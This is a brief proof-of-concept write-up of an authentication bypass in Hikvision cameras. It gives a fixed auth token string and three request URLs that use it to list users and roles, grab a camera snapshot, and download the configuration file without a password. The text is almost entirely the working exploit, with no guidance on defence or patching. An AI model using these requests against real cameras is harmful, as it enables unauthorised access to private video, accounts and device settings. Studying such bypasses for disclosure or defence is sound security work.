Hikvision included a magic string that allowed instant access to any camera, regardless of what the admin password was. All that needed was appending this string to Hikvision camera commands: (?auth=YWRtaW46MTEK)

# Proof of Concept:

Retrieve a list of all users and their roles:
- http://camera.ip/Security/users?auth=YWRtaW46MTEK

Obtain a camera snapshot without authentication:
- http://camera.ip/onvif-http/snapshot?auth=YWRtaW46MTEK

Download camera configuration:
- http://camera.ip/System/configurationFile?auth=YWRtaW46MTEK
